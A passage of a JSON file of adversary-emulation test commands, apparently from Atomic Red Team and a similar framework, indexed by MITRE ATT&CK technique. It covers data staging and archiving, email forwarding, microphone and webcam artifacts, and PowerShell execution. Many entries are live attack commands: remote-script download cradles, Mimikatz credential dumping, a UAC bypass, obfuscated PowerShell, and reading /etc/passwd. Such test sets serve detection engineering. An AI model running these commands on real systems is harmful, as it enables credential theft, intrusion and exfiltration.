         "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
         "command": "Compress-Archive -Path \"C:\\Users\\puma-4\\Desktop\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force"
      },
      {
         "technique_id": "T1074.001",
         "technique_name": "Data Staged: Local Data Staging",
         "tactic": "collection",
         "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
         "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log"
      },
      {
         "technique_id": "T1074.001",
         "technique_name": "Data Staged: Local Data Staging",
         "tactic": "collection",
         "description": "create a directory for exfil staging",
         "command": "mkdir -p staged && echo $PWD/staged\n"
      },
      {
         "technique_id": "T1074.001",
         "technique_name": "Data Staged: Local Data Staging",
         "tactic": "collection",
         "description": "copy files to staging directory",
         "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"
      }
   ],
   "T1560.001": [
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n",
         "command": "if [ $(ls /var/log/{w,b}tmp | wc -l) > 0 ] && [ -x $(which zip) ] ; then : ; else (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip); echo Please set input_files argument to include files that exist; fi;  ;  zip $HOME/data.zip /var/log/{w,b}tmp"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
         "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
         "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%programfiles%/WinRAR/Rar.exe\" a -hp\"blue\" hello.rar && dir"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n",
         "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\" && mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip * && dir"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/",
         "command": "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560; openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc ; cat /tmp/t1560/t1560_data.enc | base64"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "Note: This test requires 7zip installation\n",
         "command": "if not exist \"%ProgramFiles%\\7-zip\\7z.exe\"  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2301-x64.exe\" %TEMP%\\7zip.exe && %TEMP%\\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files && cd $PathToAtomicsFolder\\T1560.001\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\7-zip\\7z.exe\" u archive.7z *txt -pblue && dir"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
         "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  \"%programfiles%/WinRAR/Rar.exe\" a -r %USERPROFILE%\\T1560.001-data.rar %USERPROFILE%\\*.txt"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
         "command": "test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "Encrypt data for exiltration\n",
         "command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg); fi;  ;  mkdir -p /tmp/T1560; cd /tmp/T1560; touch a b c d e f g; zip --password \"InsertPasswordHere\" /tmp/T1560/T1560 ./*; echo \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip; ls -l /tmp/T1560"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "collection",
         "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux",
         "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "exfiltration",
         "description": "Compress a directory on the file system",
         "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n"
      },
      {
         "technique_id": "T1560.001",
         "technique_name": "Archive Collected Data: Archive via Utility",
         "tactic": "exfiltration",
         "description": "This ability will compress a given git repository.",
         "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;\n"
      }
   ],
   "T1560.002": [
      {
         "technique_id": "T1560.002",
         "technique_name": "Archive Collected Data: Archive via Library",
         "tactic": "collection",
         "description": "Uses tarfile from Python to compress files\n",
         "command": "which_python=`which python || which python3`; $which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.tar.gz', mode='w').write('/etc/passwd')\""
      },
      {
         "technique_id": "T1560.002",
         "technique_name": "Archive Collected Data: Archive via Library",
         "tactic": "collection",
         "description": "Uses GZip from Python to compress files\n",
         "command": "which_python=`which python || which python3`; $which_python -c \"import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();\""
      },
      {
         "technique_id": "T1560.002",
         "technique_name": "Archive Collected Data: Archive via Library",
         "tactic": "collection",
         "description": "Uses zipfile from Python to compress files\n",
         "command": "which_python=`which python || which python3`; $which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')\""
      },
      {
         "technique_id": "T1560.002",
         "technique_name": "Archive Collected Data: Archive via Library",
         "tactic": "collection",
         "description": "Uses bz2 from Python to compress files\n",
         "command": "which_python=`which python || which python3`; $which_python -c \"import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();\""
      }
   ],
   "T1123": [
      {
         "technique_id": "T1123",
         "technique_name": "Audio Capture",
         "tactic": "collection",
         "description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n",
         "command": "sh 28b0bd_T1123.sh /tmp/T1123.m4a 5"
      },
      {
         "technique_id": "T1123",
         "technique_name": "Audio Capture",
         "tactic": "collection",
         "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
         "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f"
      },
      {
         "technique_id": "T1123",
         "technique_name": "Audio Capture",
         "tactic": "collection",
         "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
         "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet"
      }
   ],
   "T1114.001": [
      {
         "technique_id": "T1114.001",
         "technique_name": "Email Collection: Local Email Collection",
         "tactic": "collection",
         "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
         "command": "powershell -executionpolicy bypass -command \"C:\\Users\\puma-4\\Desktop\\Get-Inbox.ps1\" -file $env:TEMP\\mail.csv"
      }
   ],
   "T1125": [
      {
         "technique_id": "T1125",
         "technique_name": "Video Capture",
         "tactic": "collection",
         "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
         "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f"
      }
   ],
   "T1560": [
      {
         "technique_id": "T1560",
         "technique_name": "Archive Collected Data",
         "tactic": "collection",
         "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
         "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip"
      }
   ],
   "T1114.003": [
      {
         "technique_id": "T1114.003",
         "technique_name": "Email Collection: Email Forwarding Rule",
         "tactic": "collection",
         "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n",
         "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; New-InboxRule -Name \"Atomic Red Team Email Rule\" -ForwardTo \"Atomic_Operator@fakeemail.aq\""
      }
   ],
   "T1559": [
      {
         "technique_id": "T1559",
         "technique_name": "Inter-Process Communication",
         "tactic": "execution",
         "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3"
      },
      {
         "technique_id": "T1559",
         "technique_name": "Inter-Process Communication",
         "tactic": "execution",
         "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2"
      },
      {
         "technique_id": "T1559",
         "technique_name": "Inter-Process Communication",
         "tactic": "execution",
         "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1"
      },
      {
         "technique_id": "T1559",
         "technique_name": "Inter-Process Communication",
         "tactic": "execution",
         "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5"
      },
      {
         "technique_id": "T1559",
         "technique_name": "Inter-Process Communication",
         "tactic": "execution",
         "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4"
      }
   ],
   "T1059.005": [
      {
         "technique_id": "T1059.005",
         "technique_name": "Command and Scripting Interpreter: Visual Basic",
         "tactic": "execution",
         "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
         "command": "cscript \"a771e6_sys_info.vbs\" > $env:TEMP\\T1059.005.out.txt"
      },
      {
         "technique_id": "T1059.005",
         "technique_name": "Command and Scripting Interpreter: Visual Basic",
         "tactic": "execution",
         "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
      },
      {
         "technique_id": "T1059.005",
         "technique_name": "Command and Scripting Interpreter: Visual Basic",
         "tactic": "execution",
         "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\""
      }
   ],
   "T1059.001": [
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
         "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\""
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
         "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
         "command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]) { ; } else {Write-Host Prereq's for this test cannot be met automatically};  ;  Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'; $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'; Invoke-Expression $streamcommand"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
         "command": "powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Powershell execution of known Malicious PowerShell Cmdlets",
         "command": "$malcmdlets = \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"; foreach ($cmdlets in $malcmdlets) {;     \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}; foreach ($cmdlets in $malcmdlets) {;     $cmdlets}"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
         "command": "function nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Executes powershell.exe with variations of the -Command parameter",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
         "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n",
         "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
         "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n",
         "command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ;  powershell.exe -version 2 -Command Write-Host $PSVersion"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
         "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\""
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
         "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
         "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5"
      },
      {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "tactic": "execution",
